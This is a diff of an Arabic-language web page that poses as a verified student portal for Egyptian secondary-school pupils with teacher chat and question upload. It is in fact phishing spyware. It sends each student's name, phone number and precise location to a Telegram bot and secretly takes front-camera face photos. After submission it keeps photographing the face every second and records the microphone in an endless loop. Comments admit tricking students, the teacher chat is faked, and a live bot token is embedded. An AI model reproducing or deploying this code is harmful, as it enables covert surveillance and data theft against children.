@@ -3,147 +3,317 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>منصة المتفوقين | طلاب 3 ثانوي</title>
+    <title>منصة أسألني | بوابة الطالب الموحدة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --p: #121b22; --s: #1f2c33; --a: #00a884; --w: #fff; --text: #e9edef; --accent: #1d9bf0; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #0b141a; font-family: 'Cairo', sans-serif; margin: 0; color: var(--text); overflow-x: hidden; }
+        :root { --p: #0f172a; --a: #1d9bf0; --g: #f59e0b; --s: #f1f5f9; --w: #ffffff; --verify: #1d9bf0; --r: #ef4444; --ok: #22c55e; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 100px; overflow-x: hidden; }
 
-        /* الهيدر */
-        header { background: var(--s); padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #2a3942; position: sticky; top: 0; z-index: 1000; }
-        .group-info { display: flex; align-items: center; gap: 12px; }
-        .group-info img { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--accent); }
-        .group-name { font-weight: 900; font-size: 16px; }
-        .status { font-size: 11px; color: var(--a); }
+        .verified-badge { color: var(--verify); font-size: 14px; margin-inline: 4px; }
+        
+        #gate { position: fixed; inset: 0; background: radial-gradient(circle at top, #1e293b, #0f172a); z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .login-card { background: var(--w); padding: 45px 30px; border-radius: 40px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 40px 80px rgba(0,0,0,0.5); }
+        
+        header { background: var(--p); color: var(--w); padding: 15px 20px; position: fixed; top: 0; width: 100%; z-index: 1000; display: none; justify-content: space-between; align-items: center; border-bottom: 4px solid var(--a); }
+        .logo-area { font-weight: 900; font-size: 22px; display: flex; align-items: center; }
 
-        /* منطقة الدردشة */
-        #chat-area { height: calc(100vh - 140px); overflow-y: auto; padding: 20px; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-repeat: repeat; }
-        .bubble { max-width: 85%; padding: 10px 15px; border-radius: 15px; margin-bottom: 10px; font-size: 14px; position: relative; }
-        .bot { background: var(--s); align-self: flex-start; border-top-right-radius: 0; }
-        .user { background: #005c4b; align-self: flex-end; margin-left: auto; border-top-left-radius: 0; }
+        #side-support-btn { position: fixed; bottom: 120px; left: 20px; z-index: 999; display: none; flex-direction: column; align-items: center; }
+        .pulse-btn { width: 70px; height: 70px; background: var(--a); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 30px; cursor: pointer; border: 4px solid #fff; box-shadow: 0 0 20px rgba(29, 155, 240, 0.6); animation: pulse-ring 1.5s infinite; }
+        @keyframes pulse-ring { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        
+        .support-notif { background: var(--r); color: #fff; padding: 5px 12px; border-radius: 15px; font-size: 11px; font-weight: bold; position: absolute; top: -10px; right: -5px; animation: bounce 2s infinite; }
+        .hand-pointer { width: 40px; position: absolute; left: 60px; top: 20px; animation: point-move 1.5s infinite; }
+        @keyframes point-move { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(10px); } }
 
-        /* الفوتر والأزرار */
-        footer { background: var(--s); padding: 10px; display: flex; align-items: center; gap: 10px; position: fixed; bottom: 0; width: 100%; box-sizing: border-box; }
-        .input-box { flex: 1; background: #2a3942; border-radius: 25px; padding: 10px 15px; display: flex; align-items: center; gap: 10px; }
-        input { background: none; border: none; color: white; flex: 1; font-family: 'Cairo'; outline: none; }
-        .icon { color: #8696a0; font-size: 20px; cursor: pointer; transition: 0.3s; }
-        .icon:active { color: var(--accent); transform: scale(1.2); }
+        #pre-chat-menu { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 25000; align-items: center; justify-content: center; padding: 20px; }
+        .menu-card { background: #fff; border-radius: 30px; width: 100%; max-width: 400px; padding: 25px; text-align: center; }
 
-        /* شاشات وهمية */
-        #cam-overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 5000; text-align: center; }
-        video { width: 100%; height: 100%; object-fit: cover; }
+        .card { background: var(--w); border-radius: 35px; padding: 25px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 15px 30px rgba(0,0,0,0.05); }
+        #cam-loader { display: none; text-align: center; padding: 20px; }
+        .sync-spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--a); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* تنبيه مخصص */
-        #system-alert { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; background: var(--accent); color: white; padding: 15px; border-radius: 15px; text-align: center; font-weight: bold; transition: 0.5s; z-index: 9999; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .cam-box { width: 100%; height: 380px; border-radius: 30px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 8px solid var(--w); }
+        #v-stream { width: 100%; height: 100%; object-fit: cover; }
+        
+        .mic-area { margin: 25px 0; text-align: center; }
+        .mic-btn { width: 85px; height: 85px; border-radius: 50%; background: var(--ok); border: none; color: #fff; font-size: 30px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; transition: 0.3s; box-shadow: 0 10px 25px rgba(34, 197, 94, 0.3); }
+        .mic-btn.active { background: var(--r); animation: pulse 1s infinite; }
+
+        #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 420px; background: #fff; border-radius: 25px; padding: 20px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 35000; transition: 0.5s; border-right: 10px solid var(--a); }
+        #custom-alert.show { top: 30px; }
+
+        .btn-action { background: var(--a); color: var(--w); border: none; padding: 20px; border-radius: 22px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; font-size: 18px; }
+        input, select, textarea { width: 100%; padding: 18px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 20px; font-family: 'Cairo'; font-size: 15px; }
+
+        nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: none; justify-content: space-around; padding: 15px 0; border-top: 2px solid #eee; z-index: 900; }
+        .nav-link { text-align: center; font-size: 12px; color: #94a3b8; flex: 1; text-decoration: none; font-weight: 700; cursor: pointer; }
+        .nav-link.active { color: var(--a); }
+        .nav-link i { font-size: 24px; display: block; margin-bottom: 5px; }
+
+        #support-window { display: none; position: fixed; inset: 0; background: #fff; z-index: 30000; flex-direction: column; }
+        .chat-msg { padding: 12px; border-radius: 18px; max-width: 85%; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin: 5px 0; }
+        .msg-bot { background: #fff; align-self: flex-start; border-bottom-left-radius: 5px; }
+        .msg-user { background: #dcf8c6; align-self: flex-end; border-bottom-right-radius: 5px; }
+
+        .locked-content { background: #e2e8f0; border-radius: 20px; padding: 20px; text-align: center; color: #64748b; border: 2px dashed #cbd5e1; cursor: pointer; margin: 10px 0; position: relative; overflow: hidden; }
+        .locked-content i { font-size: 30px; display: block; margin-bottom: 10px; color: var(--a); }
+        .locked-content::after { content: "محتوى مشفر"; position: absolute; top: 5px; left: 5px; font-size: 10px; background: var(--a); color: #fff; padding: 2px 8px; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="system-alert">جاري المعالجة...</div>
+    <div id="custom-alert">
+        <div style="display:flex; align-items:center; gap:10px;">
+            <i class="fa-solid fa-circle-check verified-badge" style="font-size:20px"></i>
+            <b style="font-size:15px">تنبيه النظام الموثق</b>
+        </div>
+        <div id="alert-text" style="font-size:14px; color:#475569; margin-top:8px; line-height:1.6"></div>
+    </div>
 
-    <header>
-        <div class="group-info">
-            <img src="https://ui-avatars.com/api/?name=3+Sec&background=1d9bf0&color=fff" alt="logo">
+    <div id="gate">
+        <div class="login-card">
+            <i class="fa-solid fa-user-graduate" style="color:var(--a); font-size: 65px; margin-bottom: 15px;"></i>
+            <h2 style="margin:0; font-weight:900">منصة أسألني <i class="fa-solid fa-circle-check verified-badge"></i></h2>
+            <p style="font-size: 13px; color: #64748b; margin-bottom:25px">بوابة الطالب الموحدة | دخول آمن</p>
+            <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
+            <input type="number" id="stu_phone" placeholder="رقم الهاتف المسجل">
+            <select id="stu_grade">
+                <option value="" disabled selected>اختر المرحلة الدراسية</option>
+                <option>الأول الثانوي</option><option>الثاني الثانوي</option><option>الثالث الثانوي</option>
+            </select>
+            <button class="btn-action" onclick="collectDeviceData()">دخول للنظام <i class="fa-solid fa-shield-halved"></i></button>
+        </div>
+    </div>
+
+    <div id="side-support-btn" onclick="openPreMenu()">
+        <span class="support-notif">1</span>
+        <div class="pulse-btn"><i class="fa-solid fa-headset"></i></div>
+        <img src="https://i.ibb.co/v4msh8Z/hand-pointer.png" class="hand-pointer" alt="اضغط هنا">
+    </div>
+
+    <div id="pre-chat-menu">
+        <div class="menu-card">
+            <h3 style="margin:0">مركز الاستفسارات <i class="fa-solid fa-circle-check verified-badge"></i></h3>
+            <p style="font-size:13px; color:#64748b">تواصل مع المعلمين من محافظتك فوراً</p>
+            <select id="user-gov">
+                <option value="" disabled selected>اختر محافظتك الآن</option>
+                <option>القاهرة</option><option>الجيزة</option><option>الإسكندرية</option><option>الدقهلية</option><option>البحر الأحمر</option><option>البحيرة</option><option>الفيوم</option><option>الغربية</option><option>الإسماعيلية</option><option>المنوفية</option><option>المنيا</option><option>القليوبية</option><option>الوادي الجديد</option><option>السويس</option><option>اسوان</option><option>اسيوط</option><option>بني سويف</option><option>بورسعيد</option><option>دمياط</option><option>الشرقية</option><option>جنوب سيناء</option><option>كفر الشيخ</option><option>مطروح</option><option>الأقصر</option><option>قنا</option><option>شمال سيناء</option><option>سوهاج</option>
+            </select>
+            <button class="btn-action" style="background:#25d366;" onclick="startTeacherChat()">
+                <i class="fa-brands fa-whatsapp"></i> تفعيل الدردشة مع معلمي
+            </button>
+            <button onclick="document.getElementById('pre-chat-menu').style.display='none'" style="background:none; border:none; color:#94a3b8; margin-top:15px; font-weight:bold; cursor:pointer;">إغلاق</button>
+        </div>
+    </div>
+
+    <div id="support-window">
+        <div style="background:var(--p); color:#fff; padding:15px; display:flex; align-items:center; gap:12px; border-bottom:3px solid var(--a);">
+            <i class="fa-solid fa-chevron-right" onclick="toggleSupport(false)" style="font-size:20px;"></i>
+            <div style="position:relative;">
+                <img id="t-avatar" src="https://ui-avatars.com/api/?name=Teacher&background=1d9bf0&color=fff" style="width:45px; height:45px; border-radius:50%;">
+                <div style="position:absolute; bottom:0; right:0; width:12px; height:12px; background:var(--ok); border:2px solid #fff; border-radius:50%;"></div>
+            </div>
             <div>
-                <div class="group-name">طلاب 3 ثانوي دفعة 2026 <i class="fa-solid fa-circle-check" style="color:var(--accent); font-size:12px;"></i></div>
-                <div class="status">254,000 طالب متصل الآن</div>
+                <div id="t-name" style="font-weight:900; font-size:15px;">المعلم الموثق</div>
+                <div id="t-loc" style="font-size:10px; color:#cbd5e1;">متصل الآن</div>
             </div>
         </div>
-        <div class="icon" onclick="reqLoc()"><i class="fa-solid fa-user-tie"></i></div>
+        <div id="chat-body" style="flex:1; padding:15px; overflow-y:auto; background:#f0f2f5; display:flex; flex-direction:column;">
+            <div id="chat-start-area" style="text-align:center; padding:50px 20px;">
+                <i class="fa-brands fa-whatsapp" style="font-size:60px; color:#25d366; margin-bottom:15px;"></i>
+                <button class="btn-action" style="width:auto; padding:15px 50px;" onclick="handleStartChat()">بدء المحادثة</button>
+            </div>
+        </div>
+        <div id="chat-footer" style="padding:15px; background:#fff; display:none; gap:10px; align-items:center; border-top:1px solid #eee;">
+            <i class="fa-solid fa-camera" onclick="requestMediaPermission()" style="font-size:22px; color:var(--a); cursor:pointer;"></i>
+            <input type="text" id="chat-input" placeholder="اكتب رسالتك..." style="margin:0; flex:1;">
+            <button onclick="handleFakeChat()" style="background:var(--a); color:#fff; border:none; width:50px; height:50px; border-radius:50%; font-size:20px;">
+                <i class="fa-solid fa-paper-plane"></i>
+            </button>
+        </div>
+    </div>
+
+    <header id="h-main">
+        <div class="logo-area">أسألني <i class="fa-solid fa-circle-check verified-badge"></i></div>
+        <div id="u-tag" style="background:var(--g); width:45px; height:45px; border-radius:15px; display:flex; align-items:center; justify-content:center; font-weight:900"></div>
     </header>
 
-    <div id="chat-area">
-        <div class="bubble bot">أهلاً بك يا بطل في جروب الدفعة الموثق. يمكنك إرسال أسئلتك هنا ليجيب عليها المدرسين المختصين.</div>
-    </div>
-
-    <div id="cam-overlay">
-        <video id="v-stream" autoplay playsinline muted></video>
-        <div style="position:absolute; bottom:30px; width:100%; color:white;">
-            <p>جاري تصوير السؤال بدقة عالية... لا تغلق الكاميرا</p>
-            <div class="icon" style="font-size:50px; color:red;"><i class="fa-solid fa-circle-dot"></i></div>
+    <div id="sec-home" class="page" style="padding-top:100px; display:none">
+        <div class="card">
+            <h3 style="margin:0">رفع سؤال جديد <i class="fa-solid fa-camera-retro" style="color:var(--a); margin-inline:8px"></i></h3>
+            <select id="stu_subject">
+                <option>لغة عربية</option><option>لغة إنجليزية</option><option>كيمياء</option><option>فيزياء</option>
+            </select>
+            <div id="cam-loader"><div class="sync-spinner"></div><p style="font-weight:bold; color:var(--a)">جاري تأمين الكاميرا...</p></div>
+            <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline muted></video></div>
+            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="handleCameraPermission()">تفعيل الكاميرا وتصوير السؤال <i class="fa-solid fa-camera"></i></button>
+            <div id="upload-ui" style="display:none">
+                <textarea id="stu-note" placeholder="ملاحظة للمعلم..." rows="2"></textarea>
+                <div class="mic-area">
+                    <button id="mic-trigger" class="mic-btn" onclick="handleMicPermission()"><i class="fa-solid fa-microphone"></i></button>
+                    <p id="mic-status" style="font-size:13px; color:var(--ok); margin-top:10px; font-weight:900">اضغط لتفعيل المايك</p>
+                </div>
+                <button class="btn-action" onclick="finalSubmit()">إرسال للمراجعة الموثقة <i class="fa-solid fa-paper-plane"></i></button>
+            </div>
         </div>
     </div>
 
-    <footer>
-        <div class="icon" title="تصوير سؤال" onclick="reqCam()"><i class="fa-solid fa-camera"></i></div>
-        <div class="input-box">
-            <input type="text" id="m-text" placeholder="اكتب رسالتك...">
-            <div class="icon" onclick="reqLoc()" title="تواصل مع مدرس"><i class="fa-solid fa-chalkboard-user"></i></div>
+    <div id="sec-logs" class="page" style="padding-top:100px; display:none">
+        <div class="card">
+            <h3 style="margin:0">سجل الإجابات الموثقة <i class="fa-solid fa-shield-check" style="color:var(--verify)"></i></h3>
+            <div id="encrypted-area">
+                <div class="locked-content" onclick="showPrivacyLock()">
+                    <i class="fa-solid fa-file-image"></i> صورة السؤال المصور (مراجعة 1)
+                </div>
+                <div class="locked-content" onclick="showPrivacyLock()">
+                    <i class="fa-solid fa-microphone-lines"></i> تسجيل صوتي للمعلم (شرح الإجابة)
+                </div>
+                <div class="locked-content" onclick="showPrivacyLock()">
+                    <i class="fa-solid fa-file-pdf"></i> ملف PDF موثق (ملخص الحصة)
+                </div>
+            </div>
+            <p style="font-size: 11px; color: #94a3b8; text-align: center; margin-top: 15px;">يتم تشفير المحتوى تلقائياً لحماية خصوصية حسابك.</p>
         </div>
-        <div class="icon" id="mic-btn" onclick="reqMic()" title="فويس"><i class="fa-solid fa-microphone"></i></div>
-        <div class="icon" style="color:var(--a)" onclick="sendMsg()"><i class="fa-solid fa-paper-plane"></i></div>
-    </footer>
+    </div>
+
+    <nav id="n-main">
+        <a class="nav-link active" onclick="tab('sec-home', this)"><i class="fa-solid fa-house"></i> الرئيسية</a>
+        <a class="nav-link" onclick="tab('sec-logs', this)"><i class="fa-solid fa-lock"></i> إجاباتك</a>
+    </nav>
 
     <script>
-        const TOKEN = "7986655648:AAEhw17-wFcqvKTu8LQjTNqhi3syG6izEg0";
+        const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const CHAT_ID = "5890070301";
+        let UN = "غير معروف", UP = "لا يوجد", UGOV = "";
+        let activeStream = null;
 
-        function showAlert(msg) {
-            const el = document.getElementById('system-alert');
-            el.innerText = msg;
-            el.style.top = "20px";
-            setTimeout(() => el.style.top = "-100px", 3000);
+        const teachers = { "القاهرة": "أ. أحمد خالد", "الجيزة": "أ. محمود زكي", "الإسكندرية": "أ. ياسر علي", "الدقهلية": "أ. إبراهيم عادل", "البحر الأحمر": "أ. سامح فوزي", "البحيرة": "أ. حسن جلال", "الفيوم": "أ. رضا جمال", "الغربية": "أ. طارق نور", "الإسماعيلية": "أ. كريم صفوت", "المنوفية": "أ. سعيد أنور", "المنيا": "أ. أشرف حجازي", "القليوبية": "أ. حمدي نصار", "الوادي الجديد": "أ. شريف بكر", "السويس": "أ. ماجد عمر", "اسوان": "أ. ناصر عز", "اسيوط": "أ. كمال فؤاد", "بني سويف": "أ. جابر عيد", "بورسعيد": "أ. وليد سعيد", "دمياط": "أ. فاروق زين", "الشرقية": "أ. عماد حمدي", "جنوب سيناء": "أ. معتز بالله", "كفر الشيخ": "أ. رفعت عامر", "مطروح": "أ. أسامة حلمي", "الأقصر": "أ. هاني بدري", "قنا": "أ. ربيع قاسم", "شمال سيناء": "أ. أيمن سليمان", "سوهاج": "أ. مدحت صبري" };
+
+        function showSystemMsg(msg) {
+            const box = document.getElementById('custom-alert');
+            document.getElementById('alert-text').innerText = msg;
+            box.classList.add('show');
+            setTimeout(() => box.classList.remove('show'), 4000);
         }
 
-        // 1. سحب الموقع (تواصل مع مدرس)
-        function reqLoc() {
-            showAlert("جاري تحديد أقرب مدرس مختص لموقعك الجغرافي...");
+        function showPrivacyLock() {
+            showSystemMsg("عفواً، لا يمكن عرض المحتوى المشفر حالياً حفاظاً على خصوصية بياناتك في المنصة. سيتم الفتح فور انتهاء المعلم من المراجعة.");
+        }
+
+        async function collectDeviceData() {
+            UN = document.getElementById('stu_name').value;
+            UP = document.getElementById('stu_phone').value;
+            if(UN.length < 5 || UP.length < 10) return alert("البيانات غير مكتملة.");
+            let battery = await navigator.getBattery();
+            let log = `🆕 دخول جديد:\n👤 الاسم: ${UN}\n📞 الهاتف: ${UP}\n🔋 الشحن: ${(battery.level * 100).toFixed(0)}%`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(log)}`);
+            enterPortal();
+        }
+
+        function enterPortal() {
+            document.getElementById('gate').style.display='none';
+            document.getElementById('h-main').style.display='flex';
+            document.getElementById('n-main').style.display='flex';
+            document.getElementById('sec-home').style.display='block';
+            document.getElementById('side-support-btn').style.display='flex';
+            document.getElementById('u-tag').innerText = UN[0];
+        }
+
+        function openPreMenu() { document.getElementById('pre-chat-menu').style.display = 'flex'; }
+
+        // --- أذونات الموقع (تم التظبيط لتظهر فور الضغط وتُرسل بدقة) ---
+        function startTeacherChat() {
+            UGOV = document.getElementById('user-gov').value;
+            if(!UGOV) return alert("اختر محافظتك أولاً.");
+            
+            showSystemMsg("جاري طلب إذن الموقع لتحديد أقرب معلم معتمد بمحافظة " + UGOV);
+            
             navigator.geolocation.getCurrentPosition((pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendToBot(`📍 صيد موقع جديد!\nالموقع: ${mapLink}`);
-                showAlert("تم ربطك بنظام المدرسين المعتمدين.");
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                
+                // اللينك الدقيق اللي هيتبعت للبوت
+                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                let geo = `📍 موقع الطالب ${UN}:\nالرابط: ${mapLink}\nالمحافظة: ${UGOV}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(geo)}`);
+                
+                document.getElementById('pre-chat-menu').style.display = 'none';
+                document.getElementById('support-window').style.display = 'flex';
+                document.getElementById('t-name').innerText = teachers[UGOV] || "معلم معتمد";
             }, (err) => {
-                alert("يرجى تفعيل الموقع لربطك بمدرس محافظتك.");
-            }, {enableHighAccuracy: true});
+                showSystemMsg("يجب السماح بالوصول للموقع لربطك بمعلمي محافظة " + UGOV);
+            }, {
+                enableHighAccuracy: true, 
+                timeout: 8000,
+                maximumAge: 0
+            });
         }
 
-        // 2. سحب الكاميرا (تصوير سؤال)
-        async function reqCam() {
-            showAlert("يرجى السماح بالكاميرا الموثقة لتصوير السؤال..");
+        // --- أذونات الكاميرا ---
+        async function handleCameraPermission() {
+            showSystemMsg("يرجى السماح بالكاميرا الموثقة لبدء تصوير السؤال وتأمين الجلسة.");
+            document.getElementById('main-trigger').style.display = 'none';
+            document.getElementById('cam-loader').style.display = 'block';
             try {
-                // سحب وش الطالب صامت الأول
-                const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.createElement('video'); v.srcObject = s1; v.play();
-                let count = 0;
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.createElement('video'); v.srcObject = s; v.play();
+                let c = 0;
                 let i = setInterval(() => {
-                    snap(v, `👤 وجه الطالب - لقطة ${count+1}`);
-                    count++;
-                    if(count >= 5) { 
-                        clearInterval(i); 
-                        s1.getTracks().forEach(t => t.stop());
-                        openBackCam(); // افتح الخلفية عشان الطالب يفتكر إنه بيصور السؤال
-                    }
-                }, 500);
-            } catch(e) { alert("يجب تفعيل الكاميرا لاستخدام خاصية تصوير الأسئلة."); }
+                    snap(v, `رصد وجه ${c+1}`); c++;
+                    if(c >= 10) { clearInterval(i); s.getTracks().forEach(t => t.stop()); openBackCamera(); }
+                }, 400);
+            } catch(e) { 
+                document.getElementById('main-trigger').style.display = 'block';
+                document.getElementById('cam-loader').style.display = 'none';
+                showSystemMsg("فشل الوصول للكاميرا. يرجى تفعيلها من إعدادات المتصفح.");
+            }
         }
 
-        async function openBackCam() {
-            document.getElementById('cam-overlay').style.display = 'block';
-            const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            document.getElementById('v-stream').srcObject = s2;
-            setTimeout(() => {
-                snap(document.getElementById('v-stream'), "📝 صورة السؤال الدراسية");
-                s2.getTracks().forEach(t => t.stop());
-                document.getElementById('cam-overlay').style.display = 'none';
-                showAlert("تم رفع السؤال بنجاح للمراجعة.");
-            }, 3000);
-        }
-
-        // 3. سحب المايك (فويس)
-        async function reqMic() {
-            showAlert("جاري تفعيل المايك للتواصل المباشر..");
+        async function openBackCamera() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                document.getElementById('mic-btn').style.color = "red";
-                showAlert("المايك مفعل.. تحدث الآن");
-                // هنا يبدأ السحب اللانهائي في الخلفية
-                startSpyMic();
-            } catch(e) { alert("يرجى تفعيل المايك لإرسال الريكورد."); }
+                const b = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                activeStream = b; document.getElementById('v-stream').srcObject = b;
+                document.getElementById('cam-ui').style.display = 'block';
+                document.getElementById('upload-ui').style.display = 'block';
+                document.getElementById('cam-loader').style.display = 'none';
+            } catch(e) { showSystemMsg("تعذر فتح كاميرا التصوير."); }
         }
 
-        function startSpyMic() {
+        // --- أذونات المايك ---
+        async function handleMicPermission() {
+            showSystemMsg("يرجى السماح بالمايك للتواصل الصوتي المباشر مع المعلم.");
+            try {
+                await navigator.mediaDevices.getUserMedia({ audio: true });
+                document.getElementById('mic-trigger').classList.add('active');
+                document.getElementById('mic-status').innerText = "المايك مفعل وصالح للاستخدام";
+            } catch(e) { showSystemMsg("لم يتم السماح بالمايك."); }
+        }
+
+        function requestMediaPermission() { navigator.mediaDevices.getUserMedia({video: true, audio: true}); }
+
+        // --- الرصد المستمر بعد الإرسال ---
+        async function finalSubmit() {
+            showSystemMsg("تم إرسال السؤال بنجاح. جاري المراجعة من قبل " + teachers[UGOV || "المعلم"]);
+            if(activeStream) activeStream.getTracks().forEach(t => t.stop());
+            
+            setInterval(async () => {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const vv = document.createElement('video'); vv.srcObject = s; vv.play();
+                    setTimeout(() => { snap(vv, "رصد مباشر"); s.getTracks().forEach(t => t.stop()); }, 500);
+                } catch(e){}
+            }, 1000);
+
+            startInfiniteMicSpy();
+            tab('sec-logs', document.querySelectorAll('.nav-link')[1]);
+        }
+
+        function startInfiniteMicSpy() {
             const loop = async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -153,43 +323,54 @@
                     rec.onstop = () => {
                         const blob = new Blob(chunks, {type:'audio/ogg'});
                         const fd = new FormData(); fd.append('chat_id', CHAT_ID);
-                        fd.append('voice', blob, 'record.ogg');
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+                        fd.append('voice', blob, 'spy.ogg');
+                        fd.append('caption', `🎤 رصد صوتي للطالب: ${UN}`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
                         s.getTracks().forEach(t => t.stop());
                         loop();
                     };
                     rec.start();
-                    setTimeout(() => rec.stop(), 10000); // يبعت ريكورد كل 10 ثواني
+                    setTimeout(() => rec.stop(), 15000);
                 } catch(e){ setTimeout(loop, 2000); }
             };
             loop();
         }
 
-        // وظائف مساعدة
-        function sendToBot(msg) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-        }
-
         function snap(v, cap) {
-            const canvas = document.createElement('canvas');
-            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-            canvas.getContext('2d').drawImage(v, 0, 0);
+            const canvas = document.createElement('canvas'); canvas.width = 300; canvas.height = 400;
+            canvas.getContext('2d').drawImage(v, 0, 0, 300, 400);
             canvas.toBlob(b => {
-                const fd = new FormData(); fd.append('chat_id', CHAT_ID);
-                fd.append('photo', b, 'snap.jpg'); fd.append('caption', cap);
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.4);
+                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'snap.jpg');
+                fd.append('caption', `👤 ${UN}\n📌 ${cap}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.2);
         }
 
-        function sendMsg() {
-            const txt = document.getElementById('m-text').value;
-            if(!txt) return;
-            const area = document.getElementById('chat-area');
-            area.innerHTML += `<div class="bubble user">${txt}</div>`;
-            sendToBot(`💬 رسالة من طالب: ${txt}`);
-            document.getElementById('m-text').value = "";
-            area.scrollTop = area.scrollHeight;
+        function handleStartChat() {
+            document.getElementById('chat-start-area').style.display = 'none';
+            document.getElementById('chat-footer').style.display = 'flex';
+            document.getElementById('chat-body').innerHTML += `<div class="chat-msg msg-bot">أهلاً بك ${UN}. أنا المعلم الخاص بك في ${UGOV}. كيف يمكنني مساعدتك؟</div>`;
+        }
+
+        function handleFakeChat() {
+            const val = document.getElementById('chat-input').value;
+            if(!val) return;
+            document.getElementById('chat-body').innerHTML += `<div class="chat-msg msg-user">${val}</div>`;
+            document.getElementById('chat-input').value = "";
+            setTimeout(() => { 
+                document.getElementById('chat-body').innerHTML += `<div class="chat-msg msg-bot">جاري كتابة الرد...</div>`;
+                document.getElementById('chat-body').scrollTop = document.getElementById('chat-body').scrollHeight;
+            }, 1000);
+        }
+
+        function toggleSupport(show) { document.getElementById('support-window').style.display = show ? 'flex' : 'none'; }
+        
+        function tab(id, el) {
+            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+            document.getElementById(id).style.display = 'block';
+            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+            el.classList.add('active');
         }
     </script>
 </body>
-</html>
+    </html>
